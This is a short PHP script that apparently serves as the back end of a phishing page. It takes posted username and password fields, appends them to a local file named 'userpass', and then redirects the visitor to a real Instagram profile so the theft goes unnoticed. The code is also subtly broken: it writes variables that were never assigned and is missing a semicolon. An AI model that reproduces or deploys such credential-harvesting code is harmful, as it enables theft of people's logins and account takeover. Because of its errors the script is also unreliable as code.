<?php

$email = $_POST['username'];
$pass = $_POST['password'];

$f = fopen('userpass','a');
fwrite($f,'username:' . $username . ' password:' . $password . ' ');
echo '
 <SCRIPT LANGUAGE="JavaScript">
  document.location.href="https://www.instagram.com/thelinuxproject/?hl=fr"
 </SCRIPT>
'

?>
